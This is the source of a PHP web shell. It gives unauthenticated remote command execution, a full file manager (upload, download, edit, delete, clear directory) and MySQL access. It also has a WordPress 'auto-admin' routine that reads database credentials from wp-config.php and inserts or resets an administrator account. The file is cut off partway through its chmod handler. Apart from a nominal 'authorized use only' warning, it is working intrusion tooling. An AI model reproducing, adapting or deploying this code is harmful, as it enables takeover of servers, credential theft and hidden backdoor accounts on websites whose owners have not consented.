<?php
/**
 * Advanced PHP Web Shell - Terminal & File Manager + MySQL
 * Version: 1.2.1
 * WARNING: Extremely dangerous. Use only in controlled, authorized environments.
 *
 * Changelog:
 *   1.2.1 - Fix JS syntax error on rename/chmod/copy/dirsize by using data-* attributes
 *   1.2.0 - Fix rename/chmod/search reload bug (missing type="button" in bulkForm)
 *           Fix JS string escaping using json_encode()
 *   1.1.0 - Handles disabled exec/shell_exec gracefully
 *           Added upload ZIP and extract to current directory
 *   1.0.0 - Initial release
 */

session_start();

error_reporting(E_ALL);
ini_set('display_errors', 1);

// --- Configuration ---
$title = "PHP Shell • Terminal & File Manager";
$max_upload = 50 * 1024 * 1024; // 50MB
$hist_limit = 50;

// --- Session Init ---
if (!isset($_SESSION['history']))
    $_SESSION['history'] = [];
if (!isset($_SESSION['cwd']))
    $_SESSION['cwd'] = getcwd();
if (!isset($_SESSION['db']))
    $_SESSION['db'] = null;

if (!is_dir($_SESSION['cwd']))
    $_SESSION['cwd'] = getcwd();

// --- Helper Functions ---
function safeCwd()
{
    return $_SESSION['cwd'];
}

function formatSize($bytes)
{
    if ($bytes < 0)
        $bytes = 0;
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

function dirSize($dir)
{
    $size = 0;
    if (!is_dir($dir))
        return $size;
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $size += $file->getSize();
            }
        }
    } catch (Exception $e) {
    }
    return $size;
}

function listDirectory($dir)
{
    $items = [];
    if (!is_dir($dir))
        return $items;
    $handle = @opendir($dir);
    if (!$handle)
        return $items;
    while (false !== ($entry = readdir($handle))) {
        if ($entry === '.' || $entry === '..')
            continue;
        $full = $dir . DIRECTORY_SEPARATOR . $entry;
        $isDir = is_dir($full);
        $items[] = [
            'name' => $entry,
            'path' => $full,
            'isDir' => $isDir,
            'size' => $isDir ? '--' : formatSize(@filesize($full) ?: 0),
            'rawSize' => $isDir ? 0 : (@filesize($full) ?: 0),
            'perms' => substr(sprintf('%o', @fileperms($full) ?: 0), -4),
            'modified' => date('Y-m-d H:i', @filemtime($full) ?: 0),
        ];
    }
    closedir($handle);
    usort($items, function ($a, $b) {
        if ($a['isDir'] && !$b['isDir'])
            return -1;
        if (!$a['isDir'] && $b['isDir'])
            return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

function deleteDirectoryRecursive($dir)
{
    if (!is_dir($dir))
        return false;
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..')
            continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteDirectoryRecursive($path);
        } else {
            @unlink($path);
        }
    }
    return @rmdir($dir);
}

/**
 * Clear directory: delete all contents (files + subdirs) but keep the dir itself.
 * $selfProtect = realpath of the file that must NOT be deleted (the shell itself).
 * Returns ['deleted'=>int, 'skipped'=>int, 'errors'=>int]
 */
function clearDirectory($dir, $selfProtect = null)
{
    $stats = ['deleted' => 0, 'skipped' => 0, 'errors' => 0];
    if (!is_dir($dir))
        return $stats;
    $selfProtect = $selfProtect ? realpath($selfProtect) : null;
    $items = @scandir($dir);
    if (!$items)
        return $stats;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..')
            continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        // Protect the shell file itself
        if ($selfProtect && realpath($path) === $selfProtect) {
            $stats['skipped']++;
            continue;
        }
        if (is_dir($path)) {
            // If the shell file is somewhere inside this subdir, we need to skip that file
            // but still try to clear/delete the rest of the subdir
            if ($selfProtect && strpos($selfProtect, realpath($path) . DIRECTORY_SEPARATOR) === 0) {
                // Shell is inside this subdir — recursively clear but protect shell
                clearDirectoryRecursiveProtected($path, $selfProtect, $stats);
                // Don't rmdir because shell is inside
                $stats['skipped']++;
            } else {
                // Safe to delete fully
                if (_deleteRecursivePlain($path)) {
                    $stats['deleted']++;
                } else {
                    $stats['errors']++;
                }
            }
        } else {
            if (@unlink($path)) {
                $stats['deleted']++;
            } else {
                $stats['errors']++;
            }
        }
    }
    return $stats;
}

function _deleteRecursivePlain($dir)
{
    if (!is_dir($dir))
        return @unlink($dir);
    $items = @scandir($dir);
    if (!$items)
        return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..')
            continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path))
            _deleteRecursivePlain($path);
        else
            @unlink($path);
    }
    return @rmdir($dir);
}

function clearDirectoryRecursiveProtected($dir, $selfProtect, &$stats)
{
    if (!is_dir($dir))
        return;
    $items = @scandir($dir);
    if (!$items)
        return;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..')
            continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if ($selfProtect && realpath($path) === $selfProtect) {
            $stats['skipped']++;
            continue;
        }
        if (is_dir($path)) {
            if ($selfProtect && strpos($selfProtect, realpath($path) . DIRECTORY_SEPARATOR) === 0) {
                clearDirectoryRecursiveProtected($path, $selfProtect, $stats);
            } else {
                if (_deleteRecursivePlain($path))
                    $stats['deleted']++;
                else
                    $stats['errors']++;
            }
        } else {
            if (@unlink($path))
                $stats['deleted']++;
            else
                $stats['errors']++;
        }
    }
}

function zipDirectory($sourcePath, $outZipPath)
{
    if (!class_exists('ZipArchive'))
        return false;
    $zip = new ZipArchive();
    if ($zip->open($outZipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true)
        return false;
    $sourcePath = realpath($sourcePath);
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($sourcePath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    foreach ($iterator as $file) {
        $filePath = $file->getRealPath();
        $relativePath = substr($filePath, strlen($sourcePath) + 1);
        if ($file->isDir()) {
            $zip->addEmptyDir($relativePath);
        } else {
            $zip->addFile($filePath, $relativePath);
        }
    }
    $zip->close();
    return true;
}

/**
 * Extract ZIP file to target directory with path traversal protection.
 * Returns array: ['success'=>bool, 'extracted'=>int, 'errors'=>int, 'skipped'=>int, 'message'=>string]
 */
function extractZip($zipFile, $targetDir)
{
    $result = ['success' => false, 'extracted' => 0, 'errors' => 0, 'skipped' => 0, 'message' => ''];
    if (!class_exists('ZipArchive')) {
        $result['message'] = 'ZipArchive class not available.';
        return $result;
    }
    if (!is_file($zipFile)) {
        $result['message'] = 'ZIP file not found.';
        return $result;
    }
    if (!is_dir($targetDir)) {
        $result['message'] = 'Target directory does not exist.';
        return $result;
    }

    $zip = new ZipArchive();
    if ($zip->open($zipFile) !== true) {
        $result['message'] = 'Cannot open ZIP file.';
        return $result;
    }

    $targetDir = realpath($targetDir);
    $targetDirWithSep = $targetDir . DIRECTORY_SEPARATOR;

    for ($i = 0; $i < $zip->numFiles; $i++) {
        $entryName = $zip->getNameIndex($i);
        if ($entryName === false)
            continue;

        // Prevent directory traversal attacks
        $destPath = $targetDir . DIRECTORY_SEPARATOR . $entryName;
        $realDestPath = realpath(dirname($destPath)) . DIRECTORY_SEPARATOR . basename($destPath);
        // Normalize path separators and check if within target
        $normalizedTarget = rtrim($targetDir, '/\\') . DIRECTORY_SEPARATOR;
        $normalizedDest = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $destPath);
        if (strpos($normalizedDest, $normalizedTarget) !== 0) {
            $result['skipped']++;
            continue; // Skip files that would extract outside target
        }

        // Create directory if entry ends with slash (folder)
        if (substr($entryName, -1) === '/' || substr($entryName, -1) === '\\') {
            if (!is_dir($destPath)) {
                @mkdir($destPath, 0755, true);
            }
            continue;
        }

        // Ensure parent directory exists
        $parentDir = dirname($destPath);
        if (!is_dir($parentDir)) {
            @mkdir($parentDir, 0755, true);
        }

        // Extract file
        if ($zip->extractTo($targetDir, $entryName)) {
            $result['extracted']++;
        } else {
            $result['errors']++;
        }
    }

    $zip->close();
    $result['success'] = ($result['errors'] === 0);
    $result['message'] = "Extracted: {$result['extracted']} files, {$result['errors']} errors, {$result['skipped']} skipped (path traversal).";
    return $result;
}

function searchFiles($dir, $keyword, $maxResults = 200)
{
    $results = [];
    if (!is_dir($dir))
        return $results;
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $file) {
            if (stripos($file->getFilename(), $keyword) !== false) {
                $results[] = [
                    'path' => $file->getRealPath(),
                    'name' => $file->getFilename(),
                    'isDir' => $file->isDir(),
                    'size' => $file->isDir() ? '--' : formatSize($file->getSize()),
                ];
                if (count($results) >= $maxResults)
                    break;
            }
        }
    } catch (Exception $e) {
    }
    return $results;
}

// ============================================================
// === WP AUTO-ADMIN HELPERS ==================================
// ============================================================

/**
 * Walk UP directory tree looking for $filename, up to $maxLevels.
 * Returns absolute path if found, or false.
 */
function findFileUpward($startDir, $filename, $maxLevels = 25)
{
    $dir = realpath($startDir);
    if (!$dir) return false;
    for ($i = 0; $i < $maxLevels; $i++) {
        $candidate = $dir . DIRECTORY_SEPARATOR . $filename;
        if (file_exists($candidate)) {
            return $candidate;
        }
        $parent = dirname($dir);
        if ($parent === $dir) break; // reached filesystem root
        $dir = $parent;
    }
    return false;
}

/**
 * Parse wp-config.php for DB credentials and table prefix.
 * Uses regex — does NOT include/execute the file.
 * Returns array or false on failure.
 */
function parseWpConfig($configPath)
{
    $content = @file_get_contents($configPath);
    if ($content === false) return false;

    $extract = function($name) use ($content) {
        // Match: define('DB_NAME', 'value'); or define( "DB_NAME", "value" );
        if (preg_match("/define\s*\(\s*['\"]" . preg_quote($name, '/') . "['\"]\s*,\s*['\"]([^'\"]*)['\"].*?\)/s", $content, $m)) {
            return $m[1];
        }
        return null;
    };

    // Table prefix: $table_prefix = 'wp_';
    $prefix = 'wp_';
    if (preg_match('/\$table_prefix\s*=\s*[\'"]([a-zA-Z0-9_]+)[\'"]\s*;/', $content, $m)) {
        $prefix = $m[1];
    }

    return [
        'db_host'   => $extract('DB_HOST')     ?? 'localhost',
        'db_user'   => $extract('DB_USER')     ?? '',
        'db_pass'   => $extract('DB_PASSWORD') ?? '',
        'db_name'   => $extract('DB_NAME')     ?? '',
        'db_charset'=> $extract('DB_CHARSET')  ?? 'utf8',
        'prefix'    => $prefix,
    ];
}

/**
 * Portable PHP password hasher (phpass subset — same algorithm WordPress uses).
 * This is a self-contained implementation so we don't need wp-load.php.
 *
 * Produces $P$ hashes compatible with WordPress.
 */
function wpHashPasswordPortable($password)
{
    // itoa64 alphabet
    $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';

    $encode64 = function($input, $count) use ($itoa64) {
        $output = '';
        $i = 0;
        do {
            $value = ord($input[$i++]);
            $output .= $itoa64[$value & 0x3f];
            if ($i < $count) $value |= ord($input[$i]) << 8;
            $output .= $itoa64[($value >> 6) & 0x3f];
            if ($i++ >= $count) break;
            if ($i < $count) $value |= ord($input[$i]) << 16;
            $output .= $itoa64[($value >> 12) & 0x3f];
            if ($i++ >= $count) break;
            $output .= $itoa64[($value >> 18) & 0x3f];
        } while ($i < $count);
        return $output;
    };

    // WordPress uses log2 cost = 8 → iteration_count = 256
    $count_log2 = 8;
    $count      = 1 << $count_log2;

    // Generate 6-byte random salt → 8 char itoa64
    $random = '';
    for ($i = 0; $i < 6; $i++) $random .= chr(mt_rand(0, 255));
    $salt = '$P$' . $itoa64[min($count_log2 + 5, 30)] . $encode64($random, 6);

    // Hash
    $hash = md5($salt . $password, true);
    for ($i = 0; $i < $count; $i++) {
        $hash = md5($hash . $password, true);
    }
    return $salt . $encode64($hash, 16);
}

/**
 * Hash a password using WP's method.
 * Tries to load wp-includes/class-phpass.php first (from detected WP root),
 * falls back to our portable implementation.
 *
 * $wpRoot: directory containing wp-includes/
 * Returns hashed string.
 */
function wpHashPassword($password, $wpRoot = null)
{
    // Try loading WP's own PasswordHash class
    if ($wpRoot) {
        $phpassFile = rtrim($wpRoot, '/\\') . '/wp-includes/class-phpass.php';
        if (file_exists($phpassFile)) {
            // Include in a tight scope to avoid polluting globals
            $loaded = (function() use ($phpassFile) {
                if (!class_exists('PasswordHash')) {
                    @include_once $phpassFile;
                }
                return class_exists('PasswordHash');
            })();
            if ($loaded) {
                $hasher = new PasswordHash(8, true);
                return $hasher->HashPassword($password);
            }
        }
    }
    // Fallback: our portable phpass
    return wpHashPasswordPortable($password);
}

// ============================================================
// === WP AUTO-ADMIN ACTION ===================================
// ============================================================

/**
 * Full auto-admin flow. Returns array of step log entries:
 * [['ok'=>bool, 'msg'=>string], ...]
 */
function wpAutoAdmin($startDir, $adminLogin, $adminEmail, $adminPass, $adminDisplay = null)
{
    $log     = [];
    $ok      = function($msg) use (&$log) { $log[] = ['ok' => true,  'msg' => $msg]; };
    $fail    = function($msg) use (&$log) { $log[] = ['ok' => false, 'msg' => $msg]; };

    if (!$adminDisplay) $adminDisplay = $adminLogin;

    // ── STEP 1: Find wp-load.php (to determine WP root) ─────────────────────
    $wpLoad = findFileUpward($startDir, 'wp-load.php', 25);
    if ($wpLoad) {
        $wpRoot = dirname($wpLoad);
        $ok("Found wp-load.php → WP root: $wpRoot");
    } else {
        $wpRoot = null;
        $fail("wp-load.php not found in 25 levels up from $startDir — will still try wp-config.php");
    }

    // ── STEP 2: Find wp-config.php ───────────────────────────────────────────
    // WP sometimes puts wp-config.php one level above WP root
    $wpConfigStart = $wpRoot ?? $startDir;
    $wpConfig = findFileUpward($wpConfigStart, 'wp-config.php', 5);
    if (!$wpConfig) {
        // Try one level above wp root too
        $wpConfig = findFileUpward(dirname($wpConfigStart), 'wp-config.php', 5);
    }
    if (!$wpConfig) {
        $fail("wp-config.php not found. Cannot auto-connect to DB.");
        return $log;
    }
    $ok("Found wp-config.php: $wpConfig");

    // ── STEP 3: Parse credentials ────────────────────────────────────────────
    $cfg = parseWpConfig($wpConfig);
    if (!$cfg || empty($cfg['db_user'])) {
        $fail("Failed to parse DB credentials from wp-config.php.");
        return $log;
    }
    $ok("Parsed config → host={$cfg['db_host']} user={$cfg['db_user']} db={$cfg['db_name']} prefix={$cfg['prefix']}");

    // ── STEP 4: Hash password ────────────────────────────────────────────────
    $hashedPw = wpHashPassword($adminPass, $wpRoot);
    $hashSource = (class_exists('PasswordHash') || ($wpRoot && file_exists($wpRoot . '/wp-includes/class-phpass.php')))
        ? 'WP phpass (class-phpass.php)'
        : 'portable phpass fallback';
    $ok("Password hashed via $hashSource");

    // ── STEP 5: Connect MySQL ────────────────────────────────────────────────
    if (!function_exists('mysqli_connect')) {
        $fail("mysqli extension not available.");
        return $log;
    }
    $conn = @mysqli_connect($cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name']);
    if (!$conn) {
        $fail("MySQL connect failed: " . mysqli_connect_error());
        return $log;
    }
    mysqli_set_charset($conn, $cfg['db_charset'] ?: 'utf8');
    $ok("Connected to MySQL: {$cfg['db_user']}@{$cfg['db_host']} / {$cfg['db_name']}");

    // Also persist to session so the MySQL panel shows connected
    $_SESSION['mysql'] = [
        'host'      => $cfg['db_host'],
        'user'      => $cfg['db_user'],
        'pass'      => $cfg['db_pass'],
        'db'        => $cfg['db_name'],
        'connected' => true,
    ];

    $prefix    = $cfg['prefix'];
    $usersT    = $prefix . 'users';
    $usermetaT = $prefix . 'usermeta';
    $capKey    = $prefix . 'capabilities';
    $levelKey  = $prefix . 'user_level';

    $esc = function($v) use ($conn) { return mysqli_real_escape_string($conn, $v); };

    // ── STEP 6: Check existing user ─────────────────────────────────────────
    $r = mysqli_query($conn, "SELECT ID FROM `$usersT` WHERE user_login='" . $esc($adminLogin) . "' LIMIT 1");
    $existingId = null;
    if ($r && mysqli_num_rows($r) > 0) {
        $existingId = (int) mysqli_fetch_row($r)[0];
        mysqli_free_result($r);
        $ok("User '$adminLogin' already exists (ID: $existingId) — will update");
    } else {
        if ($r) mysqli_free_result($r);
        $ok("User '$adminLogin' does not exist — will create new");
    }

    if ($existingId) {
        // ── STEP 7a: Update existing user ───────────────────────────────────
        $q = mysqli_query($conn, "UPDATE `$usersT` SET user_pass='" . $esc($hashedPw) . "', user_email='" . $esc($adminEmail) . "', display_name='" . $esc($adminDisplay) . "' WHERE ID=$existingId");
        if (!$q) { $fail("UPDATE user failed: " . mysqli_error($conn)); mysqli_close($conn); return $log; }
        $ok("Updated user row (password + email reset)");

        // Upsert usermeta
        mysqli_query($conn, "DELETE FROM `$usermetaT` WHERE user_id=$existingId AND meta_key IN ('" . $esc($capKey) . "','" . $esc($levelKey) . "')");
        $q2 = mysqli_query($conn, "INSERT INTO `$usermetaT` (user_id,meta_key,meta_value) VALUES ($existingId,'" . $esc($capKey) . "','a:1:{s:13:\"administrator\";b:1;}')");
        $q3 = mysqli_query($conn, "INSERT INTO `$usermetaT` (user_id,meta_key,meta_value) VALUES ($existingId,'" . $esc($levelKey) . "','10')");
        if (!$q2 || !$q3) { $fail("Usermeta upsert failed: " . mysqli_error($conn)); }
        else { $ok("Usermeta set → administrator (level 10)"); }

    } else {
        // ── STEP 7b: Insert new user ─────────────────────────────────────────
        $q = mysqli_query($conn,
            "INSERT INTO `$usersT` (user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES ("
            . "'" . $esc($adminLogin)   . "',"
            . "'" . $esc($hashedPw)     . "',"
            . "'" . $esc($adminLogin)   . "',"
            . "'" . $esc($adminEmail)   . "',"
            . "NOW(),0,"
            . "'" . $esc($adminDisplay) . "')"
        );
        if (!$q) { $fail("INSERT user failed: " . mysqli_error($conn)); mysqli_close($conn); return $log; }
        $newId = (int) mysqli_insert_id($conn);
        $ok("Inserted new user (ID: $newId)");

        $q2 = mysqli_query($conn, "INSERT INTO `$usermetaT` (user_id,meta_key,meta_value) VALUES ($newId,'" . $esc($capKey) . "','a:1:{s:13:\"administrator\";b:1;}')");
        $q3 = mysqli_query($conn, "INSERT INTO `$usermetaT` (user_id,meta_key,meta_value) VALUES ($newId,'" . $esc($levelKey) . "','10')");
        if (!$q2 || !$q3) { $fail("Usermeta insert failed: " . mysqli_error($conn)); }
        else { $ok("Usermeta inserted → administrator (level 10)"); }
    }

    mysqli_close($conn);

    // ── STEP 8: Summary ──────────────────────────────────────────────────────
    $ok("✅ Done! Login: $adminLogin | Pass: $adminPass | Email: $adminEmail");

    return $log;
}

/**
 * Execute command - MODIFIED to handle disabled exec/shell_exec.
 * Only 'cd' and 'clear' work fully using PHP logic.
 * Other commands will show a friendly message that terminal is limited.
 */
function executeCommand($cmd, &$cwdRef)
{
    $cmd = trim($cmd);
    if ($cmd === '')
        return '';

    if ($cmd === 'clear' || $cmd === 'cls')
        return '__CLEAR__';

    // Handle 'cd' command with pure PHP (no shell needed)
    if (preg_match('/^cd\s*(.*)$/', $cmd, $m)) {
        $target = trim($m[1]);
        if ($target === '' || $target === '~') {
            $target = getenv('HOME') ?: (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? getenv('USERPROFILE') : '/');
        }
        if (!empty($target) && $target[0] !== '/' && !(strlen($target) >= 2 && $target[1] === ':')) {
            $target = $cwdRef . DIRECTORY_SEPARATOR . $target;
        }
        $resolved = realpath($target);
        if ($resolved && is_dir($resolved)) {
            $cwdRef = $resolved;
            $_SESSION['cwd'] = $resolved;
            return "Changed to: $resolved";
        }
        return "cd: no such directory: $target";
    }

    // For any other command, check if we can execute system commands
    $canExec = false;
    if (function_exists('shell_exec')) {
        $canExec = true;
        $execFunc = 'shell_exec';
    } elseif (function_exists('exec')) {
        $canExec = true;
        $execFunc = 'exec';
    } elseif (function_exists('system')) {
        $canExec = true;
        $execFunc = 'system';
    } elseif (function_exists('passthru')) {
        $canExec = true;
        $execFunc = 'passthru';
    }

    if (!$canExec) {
        return "⚠️ Terminal commands are disabled on this server.\nAll exec/shell_exec/system/passthru functions are unavailable.\nYou can still use 'cd' and 'clear', or the File Manager panel.";
    }

    // If we have an exec function, try to run the command
    $cwdEsc = escapeshellarg($cwdRef);
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $fullCmd = "cd /d $cwdEsc && $cmd 2>&1";
    } else {
        $fullCmd = "cd $cwdEsc && $cmd 2>&1";
    }

    $output = '';
    if ($execFunc === 'shell_exec') {
        $output = shell_exec($fullCmd);
    } elseif ($execFunc === 'exec') {
        exec($fullCmd, $o);
        $output = implode("\n", $o);
    } elseif ($execFunc === 'system') {
        ob_start();
        system($fullCmd);
        $output = ob_get_clean();
    } elseif ($execFunc === 'passthru') {
        ob_start();
        passthru($fullCmd);
        $output = ob_get_clean();
    }

    return $output === null ? '[No output]' : $output;
}

// --- Actions ---
$action = $_POST['action'] ?? $_GET['action'] ?? '';
$cwd =& $_SESSION['cwd'];
$output = '';
$command = '';
$dbMsg = '';
$uploadMsg = '';
$searchResults = null;
$searchKeyword = '';

// Ambil cleardir message dari session (redirect setelah cleardir)
if (!empty($_SESSION['cleardir_msg'])) {
    $uploadMsg = $_SESSION['cleardir_msg'];
    unset($_SESSION['cleardir_msg']);
}

// Navigate Directory (GET)
if ($action === 'cd' && isset($_GET['dir'])) {
    $target = $_GET['dir'];
    if ($target !== '/' && $target[0] !== '/' && !(strlen($target) >= 2 && $target[1] === ':')) {
        $target = $cwd . DIRECTORY_SEPARATOR . $target;
    }
    $resolved = realpath($target);
    if ($resolved && is_dir($resolved)) {
        $cwd = $resolved;
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Parent Directory
if ($action === 'parentdir') {
    $parent = dirname($cwd);
    $resolved = realpath($parent);
    if ($resolved && is_dir($resolved)) {
        $cwd = $resolved;
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// File Upload (with optional ZIP extraction)
if ($action === 'upload' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $uploadMsg = '';
    $extractZip = isset($_POST['extract_zip']) && $_POST['extract_zip'] === '1';
    if (!empty($_FILES['files']['name'][0])) {
        foreach ($_FILES['files']['tmp_name'] as $k => $tmp) {
            if ($_FILES['files']['error'][$k] !== UPLOAD_ERR_OK) {
                $uploadMsg .= "✘ Error uploading {$_FILES['files']['name'][$k]}: code {$_FILES['files']['error'][$k]}\n";
                continue;
            }
            if ($_FILES['files']['size'][$k] > $max_upload) {
                $uploadMsg .= "✘ File too large: {$_FILES['files']['name'][$k]}\n";
                continue;
            }
            $name = basename($_FILES['files']['name'][$k]);
            $target = $cwd . DIRECTORY_SEPARATOR . $name;
            if (move_uploaded_file($tmp, $target)) {
                $uploadMsg .= "✔ Uploaded: $name\n";
                // Check if ZIP extraction requested and file is .zip
                if ($extractZip && preg_match('/\.zip$/i', $name) && class_exists('ZipArchive')) {
                    $extractResult = extractZip($target, $cwd);
                    $uploadMsg .= "   ↳ " . $extractResult['message'] . "\n";
                    // Optionally delete the ZIP after extraction?
                    // @unlink($target);
                } elseif ($extractZip && !class_exists('ZipArchive')) {
                    $uploadMsg .= "   ↳ ZIP extraction not available (ZipArchive missing).\n";
                } elseif ($extractZip && !preg_match('/\.zip$/i', $name)) {
                    $uploadMsg .= "   ↳ Not a ZIP file, extraction skipped.\n";
                }
            } else {
                $uploadMsg .= "✘ Failed: $name (check permissions)\n";
            }
        }
    } else {
        $uploadMsg = "No files selected.";
    }
}

// File Download
if ($action === 'download' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
    die('Invalid file.');
}

// Directory Download (ZIP)
if ($action === 'downloaddir' && isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if ($dir && is_dir($dir)) {
        $tmpZip = sys_get_temp_dir() . DIRECTORY_SEPARATOR . basename($dir) . '_' . time() . '.zip';
        if (zipDirectory($dir, $tmpZip)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . basename($dir) . '.zip"');
            header('Content-Length: ' . filesize($tmpZip));
            readfile($tmpZip);
            @unlink($tmpZip);
            exit;
        }
        die('Cannot create ZIP. ZipArchive extension may not be available.');
    }
    die('Invalid directory.');
}

// Dir Size (AJAX)
if ($action === 'dirsize' && isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if ($dir && is_dir($dir)) {
        $sz = dirSize($dir);
        header('Content-Type: application/json');
        echo json_encode(['size' => formatSize($sz), 'bytes' => $sz]);
        exit;
    }
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Invalid directory']);
    exit;
}

// Delete File
if ($action === 'delete' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && is_file($file))
        @unlink($file);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Bulk delete
if ($action === 'bulk_delete' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $files = isset($_POST['files']) ? $_POST['files'] : array();
    $delCount = 0;
    $errCount = 0;
    foreach ($files as $f) {
        $path = realpath($cwd . DIRECTORY_SEPARATOR . $f);
        if ($path && strpos($path, $cwd) === 0 && $path !== $cwd) {
            if (is_dir($path)) {
                deleteDirectoryRecursive($path) ? $delCount++ : $errCount++;
            } else if (is_file($path)) {
                @unlink($path) ? $delCount++ : $errCount++;
            }
        }
    }
    $uploadMsg = "✔ Bulk delete completed: $delCount deleted, $errCount errors.";
}

// Delete Directory (recursive)
if ($action === 'deletedir' && isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if ($dir && is_dir($dir) && $dir !== $cwd) {
        deleteDirectoryRecursive($dir);
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Clear Directory (empty contents, keep dir, protect self)
if ($action === 'cleardir' && isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if ($dir && is_dir($dir)) {
        $selfFile = realpath($_SERVER['SCRIPT_FILENAME']);
        $stats = clearDirectory($dir, $selfFile);
        $skippedNote = $stats['skipped'] > 0 ? " ({$stats['skipped']} protected/skipped)" : '';
        $_SESSION['cleardir_msg'] = "✔ Cleared: {$stats['deleted']} deleted, {$stats['errors']} errors{$skippedNote} in " . basename($dir);
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// View File (plain text)
if ($action === 'view' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && is_file($file)) {
        header('Content-Type: text/plain; charset=utf-8');
        readfile($file);
        exit;
    }
    die('Invalid file.');
}

// Edit File - show form
$editContent = '';
$editFile = '';
if ($action === 'edit' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && is_file($file)) {
        $editFile = $file;
        $editContent = file_get_contents($file);
    }
}

// Save Edited File
if ($action === 'saveedit' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = realpath($_POST['editfile'] ?? '');
    $content = $_POST['content'] ?? '';
    if ($file && is_file($file) && is_writable($file)) {
        file_put_contents($file, $content);
        $uploadMsg = "✔ File saved: " . basename($file);
    } else {
        $uploadMsg = "✘ Failed to save file (not writable or invalid)";
    }
}

// Rename File/Dir
if ($action === 'rename' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $oldPath = realpath($_POST['oldpath'] ?? '');
    $newName = basename(trim($_POST['newname'] ?? ''));
    if ($oldPath && $newName) {
        $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
        if (!file_exists($newPath)) {
            @rename($oldPath, $newPath)
                ? ($uploadMsg = "✔ Renamed to: $newName")
                : ($uploadMsg = "✘ Rename failed (check permissions)");
        } else {
            $uploadMsg = "✘ Destination already exists: $newName";
        }
    }
}

// Create New Directory
if ($action === 'mkdir' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = basename(trim($_POST['dirname'] ?? ''));
    if ($name) {
        $target = $cwd . DIRECTORY_SEPARATOR . $name;
        @mkdir($target, 0755)
            ? ($uploadMsg = "✔ Directory created: $name")
            : ($uploadMsg = "✘ Failed to create directory: $name");
    }
}

// Create New File
if ($action === 'newfile' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = basename(trim($_POST['filename'] ?? ''));
    if ($name) {
        $target = $cwd . DIRECTORY_SEPARATOR . $name;
        if (!file_exists($target)) {
            @file_put_contents($target, '')
                ? ($uploadMsg = "✔ File created: $name")
                : ($uploadMsg = "✘ Failed to create file: $name");
        } else {
            $uploadMsg = "✘ File already exists: $name";
        }
    }
}

// Copy File
if ($action === 'copy' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $src = realpath($_POST['srcpath'] ?? '');
    $newName = basename(trim($_POST['copyname'] ?? ''));
    if ($src && is_file($src) && $newName) {
        $dest = dirname($src) . DIRECTORY_SEPARATOR . $newName;
        if (!file_exists($dest)) {
            @copy($src, $dest)
                ? ($uploadMsg = "✔ Copied to: $newName")
                : ($uploadMsg = "✘ Copy failed");
        } else {
            $uploadMsg = "✘ Destination already exists: $newName";
        }
    }
}

// Chmod
if ($action === 'chmod' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $path = realpath($_POST['chmodpath'] ?? '');
    $mode = octdec(trim($_POST['chmodval'] ?? ''));
    if ($path && $mode) {
        @chmod($path, $mode)
            ? ($uploadMsg = "✔ Chmod " . sprintf('%o', $mode) . " applied to: " . basename($path))
            : ($uploadMsg = "✘ Chmod failed (check permissions)");
